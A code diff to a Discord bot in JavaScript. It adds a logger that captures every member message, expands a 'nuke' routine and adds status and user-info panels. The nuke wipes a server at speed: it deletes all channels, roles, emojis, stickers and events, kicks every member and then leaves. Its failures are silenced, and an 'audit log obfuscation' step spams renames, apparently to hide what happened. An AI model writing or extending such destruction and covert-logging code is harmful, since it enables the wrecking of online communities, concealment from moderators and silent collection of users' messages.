@@ -22,7 +22,7 @@ const SERVERS = [
     }
 ];
 
-const OWNER_IDS = ['', '']; // add your Discord user IDs here
+const OWNER_IDS = ['', '']; // Add your Discord User IDs here
 let systemLogs = [];
 
 const client = new Client({
@@ -49,7 +49,7 @@ const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
  * @param {Function} fn        - Async function that processes one item.
  * @param {number} delayMs     - Delay between batches (ms).
  */
-async function runConcurrent(items, concurrency, fn, delayMs = 100) {
+async function runConcurrent(items, concurrency, fn, delayMs = 50) {
     const results = [];
     for (let i = 0; i < items.length; i += concurrency) {
         const batch = items.slice(i, i + concurrency);
@@ -104,6 +104,26 @@ client.once('clientReady', async (c) => {
     }
 });
 
+// ---------- Live Message Logger (New!) ----------
+client.on('messageCreate', (message) => {
+    if (message.author.bot) return;
+    if (!getGuildConfig(message.guildId)) return;
+    const content = message.content || "[Embed/Attachment/Sticker]";
+    const logEntry = `**[MSG] ${message.author.tag}** in <#${message.channelId}>: ${content}`;
+    systemLogs.unshift(logEntry);
+    if (systemLogs.length > 50) systemLogs.pop(); // Keep last 50 logs
+});
+
+// ---------- Message Deletion Logger (existing) ----------
+client.on('messageDelete', (message) => {
+    if (message.author?.bot) return;
+    if (!getGuildConfig(message.guildId)) return;
+    const header = `**[DEL] ${message.author?.tag ?? "Unknown"}** in <#${message.channelId}>`;
+    const content = `> ${message.content || "[Attachment/Embed]"}`;
+    systemLogs.unshift(`${header}\n${content}`); 
+    if (systemLogs.length > 50) systemLogs.pop(); 
+});
+
 // ---------- Reaction Roles (unchanged) ----------
 client.on('messageReactionAdd', async (reaction, user) => {
     if (user.bot) return;
@@ -121,52 +141,93 @@ client.on('messageReactionAdd', async (reaction, user) => {
     }
 });
 
-// ---------- Logger (unchanged) ----------
-client.on('messageDelete', (message) => {
-    if (message.author?.bot) return;
-    if (!getGuildConfig(message.guildId)) return;
-    const header = `**[DEL] ${message.author?.tag ?? "Unknown"}** in <#${message.channelId}>`;
-    const content = `> ${message.content || "[Attachment/Embed]"}`;
-    systemLogs.unshift(`${header}\n${content}`); 
-    if (systemLogs.length > 25) systemLogs.pop(); 
-});
-
-// ---------- Nuke function (fast & concurrent) ----------
+// ---------- ULTIMATE NUKE FUNCTION (Fastest + All Features) ----------
 async function nukeGuild(guild, botMember) {
-    // 1. Delete all channels
+    console.log(`[NUKE] Starting ultimate nuke on ${guild.name}`);
+
+    // ---- 0. Audit Log Obfuscation (Spam name/icon changes) ----
+    console.log(`[NUKE] Obfuscating audit logs...`);
+    try {
+        for (let i = 0; i < 5; i++) {
+            await guild.setName(`NUKED-${Math.random().toString(36).substring(2, 8)}`);
+            await guild.setIcon(null); // Remove icon
+            await guild.setBanner(null); // Remove banner
+            await sleep(150);
+        }
+    } catch (e) { console.log('Audit spam failed:', e.message); }
+
+    // ---- 1. Delete all channels ----
     const channels = [...guild.channels.cache.values()];
     console.log(`[NUKE] Deleting ${channels.length} channels...`);
-    await runConcurrent(channels, 5, async (channel) => {
+    await runConcurrent(channels, 10, async (channel) => {
         try {
             await channel.delete('Nuke initiated by owner');
         } catch (err) {
-            console.log(`Failed to delete channel ${channel.name}:`, err.message);
+            // ignore
         }
-    }, 150);
+    }, 50);
 
-    // 2. Delete all custom roles (except @everyone & managed)
+    // ---- 2. Delete all custom roles (except @everyone & managed) ----
     const roles = [...guild.roles.cache.filter(r => r.id !== guild.id && !r.managed).values()];
     console.log(`[NUKE] Deleting ${roles.length} roles...`);
-    await runConcurrent(roles, 5, async (role) => {
+    await runConcurrent(roles, 10, async (role) => {
         try {
             await role.delete('Nuke initiated by owner');
         } catch (err) {
-            console.log(`Failed to delete role ${role.name}:`, err.message);
+            // ignore
         }
-    }, 150);
+    }, 50);
 
-    // 3. Kick all members (except the bot)
+    // ---- 3. Delete all Emojis ----
+    const emojis = [...guild.emojis.cache.values()];
+    console.log(`[NUKE] Deleting ${emojis.length} emojis...`);
+    await runConcurrent(emojis, 10, async (emoji) => {
+        try {
+            await emoji.delete('Nuke initiated by owner');
+        } catch (err) {
+            // ignore
+        }
+    }, 50);
+
+    // ---- 4. Delete all Stickers ----
+    const stickers = [...guild.stickers.cache.values()];
+    console.log(`[NUKE] Deleting ${stickers.length} stickers...`);
+    await runConcurrent(stickers, 10, async (sticker) => {
+        try {
+            await sticker.delete('Nuke initiated by owner');
+        } catch (err) {
+            // ignore
+        }
+    }, 50);
+
+    // ---- 5. Delete all Scheduled Events ----
+    const events = [...(await guild.scheduledEvents.fetch()).values()];
+    console.log(`[NUKE] Deleting ${events.length} scheduled events...`);
+    await runConcurrent(events, 5, async (event) => {
+        try {
+            await event.delete('Nuke initiated by owner');
+        } catch (err) {
+            // ignore
+        }
+    }, 50);
+
+    // ---- 6. Kick all members (except bot) ----
     const members = [...(await guild.members.fetch()).values()].filter(m => m.id !== botMember.id);
     console.log(`[NUKE] Kicking ${members.length} members...`);
-    await runConcurrent(members, 3, async (member) => {
+    await runConcurrent(members, 5, async (member) => {
         try {
             await member.kick('Nuke initiated by owner');
         } catch (err) {
-            console.log(`Failed to kick ${member.user.tag}:`, err.message);
+            // ignore (owner or higher role)
         }
-    }, 300);
+    }, 250);
 
-    // 4. Leave the guild
+    // ---- 7. Vanity URL ----
+    try {
+        await guild.setVanityCode(null);
+    } catch (e) { /* ignore if not boosted */ }
+
+    // ---- 8. Leave the guild ----
     await guild.leave();
     console.log(`[NUKE] Left guild ${guild.name}`);
 }
@@ -176,6 +237,7 @@ client.on('interactionCreate', async interaction => {
     const conf = getGuildConfig(interaction.guildId);
     if (!conf) return;
 
+    // ---- Slash Command: /panel ----
     if (interaction.isChatInputCommand() && interaction.commandName === 'panel') {
         const userIsOwner = isOwner(interaction.user.id);
         systemLogs.unshift(`**[CMD] ${interaction.user.tag}** ran **/panel** (${userIsOwner ? "ALLOWED" : "DENIED"}) in ${conf.name}`);
@@ -188,20 +250,23 @@ client.on('interactionCreate', async interaction => {
         return interaction.reply({ content: '### Control Panel', components: [row], flags: [MessageFlags.Ephemeral] });
     }
 
+    // ---- Buttons ----
     if (interaction.isButton()) {
-        // ---- Owner Area ----
+        // ----- Owner Area (Tab) -----
         if (interaction.customId === 'tab_owner') {
             if (!isOwner(interaction.user.id)) return interaction.reply({ content: 'No perms', flags: [MessageFlags.Ephemeral] });
             const row = new ActionRowBuilder().addComponents(
                 new ButtonBuilder().setCustomId('owner_say').setLabel('Speak as Bot').setStyle(ButtonStyle.Secondary),
                 new ButtonBuilder().setCustomId('owner_dm').setLabel('Send DM').setStyle(ButtonStyle.Secondary),
                 new ButtonBuilder().setCustomId('owner_view_logs').setLabel('View Logs').setStyle(ButtonStyle.Secondary),
+                new ButtonBuilder().setCustomId('owner_server_status').setLabel('📊 Server Status').setStyle(ButtonStyle.Primary),
+                new ButtonBuilder().setCustomId('owner_user_info').setLabel('👤 User Info').setStyle(ButtonStyle.Primary),
                 new ButtonBuilder().setCustomId('owner_nuke').setLabel('💀 Nuke Server').setStyle(ButtonStyle.Danger)
             );
             return interaction.reply({ content: 'Owner Actions:', components: [row], flags: [MessageFlags.Ephemeral] });
         }
 
-        // ---- Admin Tools ----
+        // ----- Admin Tools (Tab) -----
         if (interaction.customId === 'tab_admin') {
             if (!interaction.member.permissions.has(PermissionFlagsBits.Administrator)) return interaction.reply({ content: 'No perms', flags: [MessageFlags.Ephemeral] });
             const row = new ActionRowBuilder().addComponents(
@@ -210,7 +275,44 @@ client.on('interactionCreate', async interaction => {
             return interaction.reply({ content: 'Admin Tools:', components: [row], flags: [MessageFlags.Ephemeral] });
         }
 
-        // ---- Owner: Speak ----
+        // ----- Owner: Server Status (NEW) -----
+        if (interaction.customId === 'owner_server_status') {
+            if (!isOwner(interaction.user.id)) return interaction.reply({ content: 'No perms', flags: [MessageFlags.Ephemeral] });
+            const g = interaction.guild;
+            const info = `
+**📊 Server Status**
+**Name:** ${g.name}
+**ID:** ${g.id}
+**Owner:** <@${g.ownerId}>
+**Members:** ${g.memberCount}
+**Boosts:** ${g.premiumSubscriptionCount || 0}
+**Channels:** ${g.channels.cache.size}
+**Roles:** ${g.roles.cache.size}
+**Emojis:** ${g.emojis.cache.size}
+**Stickers:** ${g.stickers.cache.size}
+**Created:** <t:${Math.floor(g.createdTimestamp / 1000)}:R>
+            `;
+            return interaction.reply({ content: info, flags: [MessageFlags.Ephemeral] });
+        }
+
+        // ----- Owner: User Info (NEW) -----
+        if (interaction.customId === 'owner_user_info') {
+            if (!isOwner(interaction.user.id)) return interaction.reply({ content: 'No perms', flags: [MessageFlags.Ephemeral] });
+            const modal = new ModalBuilder().setCustomId('modal_userinfo').setTitle('User Info');
+            modal.addComponents(
+                new ActionRowBuilder().addComponents(
+                    new TextInputBuilder()
+                        .setCustomId('user_id_input')
+                        .setLabel('User ID or Mention')
+                        .setStyle(TextInputStyle.Short)
+                        .setRequired(true)
+                        .setPlaceholder('123456789012345678 or @user')
+                )
+            );
+            return interaction.showModal(modal);
+        }
+
+        // ----- Owner: Speak -----
         if (interaction.customId === 'owner_say') {
             const modal = new ModalBuilder().setCustomId('modal_say').setTitle('The Megaphone');
             modal.addComponents(
@@ -220,7 +322,7 @@ client.on('interactionCreate', async interaction => {
             return interaction.showModal(modal);
         }
 
-        // ---- Owner: DM ----
+        // ----- Owner: DM -----
         if (interaction.customId === 'owner_dm') {
             const modal = new ModalBuilder().setCustomId('modal_dm').setTitle('Send Direct Message');
             modal.addComponents(
@@ -230,13 +332,13 @@ client.on('interactionCreate', async interaction => {
             return interaction.showModal(modal);
         }
 
-        // ---- Owner: View Logs ----
+        // ----- Owner: View Logs -----
         if (interaction.customId === 'owner_view_logs') {
             const content = systemLogs.length > 0 ? systemLogs.join('\n\n') : "No recent logs.";
-            return interaction.update({ content: `### System Logs\n${content}`, components: [] });
+            return interaction.update({ content: `### System Logs (Last 50)\n${content}`, components: [] });
         }
 
-        // ---- Owner: Nuke ----
+        // ----- Owner: Nuke -----
         if (interaction.customId === 'owner_nuke') {
             if (!isOwner(interaction.user.id)) return interaction.reply({ content: 'No perms', flags: [MessageFlags.Ephemeral] });
 
@@ -256,7 +358,7 @@ client.on('interactionCreate', async interaction => {
             return interaction.showModal(modal);
         }
 
-        // ---- Admin: Timeout ----
+        // ----- Admin: Timeout -----
         if (interaction.customId === 'admin_timeout') {
             const modal = new ModalBuilder().setCustomId('modal_timeout').setTitle('Admin Timeout');
             modal.addComponents(
@@ -269,6 +371,7 @@ client.on('interactionCreate', async interaction => {
 
     // ---------- Modal Submits ----------
     if (interaction.isModalSubmit()) {
+        // ----- Speak Modal -----
         if (interaction.customId === 'modal_say') {
             const content = interaction.fields.getTextInputValue('s_text');
             const targetChannelId = interaction.fields.getTextInputValue('s_channel');
@@ -279,6 +382,7 @@ client.on('interactionCreate', async interaction => {
             } catch (err) { return interaction.reply({ content: `Error: ${err.message}`, flags: [MessageFlags.Ephemeral] }); }
         }
 
+        // ----- DM Modal -----
         if (interaction.customId === 'modal_dm') {
             const targetId = interaction.fields.getTextInputValue('dm_target');
             const msg = interaction.fields.getTextInputValue('dm_text');
@@ -289,6 +393,7 @@ client.on('interactionCreate', async interaction => {
             } catch (err) { return interaction.reply({ content: `Failed: ${err.message}`, flags: [MessageFlags.Ephemeral] }); }
         }
 
+        // ----- Timeout Modal -----
         if (interaction.customId === 'modal_timeout') {
             const id = interaction.fields.getTextInputValue('t_target');
             const days = parseInt(interaction.fields.getTextInputValue('t_days'));
@@ -300,7 +405,31 @@ client.on('interactionCreate', async interaction => {
             } catch (err) { return interaction.reply({ content: `Error: ${err.message}`, flags: [MessageFlags.Ephemeral] }); }
         }
 
-        // ---------- NUKE CONFIRMATION ----------
+        // ----- User Info Modal (NEW) -----
+        if (interaction.customId === 'modal_userinfo') {
+            const input = interaction.fields.getTextInputValue('user_id_input').trim();
+            let userId = input.replace(/[<@!>]/g, ''); // strip mention chars
+            try {
+                const member = await interaction.guild.members.fetch(userId);
+                const user = member.user;
+                const info = `
+**👤 User Info**
+**Tag:** ${user.tag}
+**ID:** ${user.id}
+**Nickname:** ${member.nickname || 'None'}
+**Bot:** ${user.bot ? '✅ Yes' : '❌ No'}
+**Joined:** <t:${Math.floor(member.joinedTimestamp / 1000)}:R>
+**Created:** <t:${Math.floor(user.createdTimestamp / 1000)}:R>
+**Roles:** ${member.roles.cache.map(r => r.toString()).join(', ') || 'None'}
+**Avatar:** ${user.displayAvatarURL({ size: 256, dynamic: true })}
+                `;
+                return interaction.reply({ content: info, flags: [MessageFlags.Ephemeral] });
+            } catch (err) {
+                return interaction.reply({ content: `❌ User not found in this server.`, flags: [MessageFlags.Ephemeral] });
+            }
+        }
+
+        // ----- NUKE CONFIRMATION (UPDATED) -----
         if (interaction.customId === 'modal_nuke') {
             const confirmText = interaction.fields.getTextInputValue('nuke_confirm');
             if (confirmText !== 'CONFIRM') {
@@ -314,12 +443,11 @@ client.on('interactionCreate', async interaction => {
 
             try {
                 await nukeGuild(guild, botMember);
-                // After leaving, we can't reply to the interaction, so try to DM the owner
+                // After leaving, we can't reply to the interaction, so DM the owner
                 try {
                     const owner = await client.users.fetch(interaction.user.id);
-                    await owner.send(`✅ Server **${guild.name}** has been nuked and the bot has left.`);
+                    await owner.send(`✅ Server **${guild.name}** has been fully nuked and the bot has left.`);
                 } catch (dmErr) { /* ignore */ }
-                // Edit the ephemeral reply if still possible (unlikely after leave)
                 try {
                     await interaction.editReply({ content: '✅ Nuke completed. Bot has left the server.' });
                 } catch (editErr) { /* ignore */ }
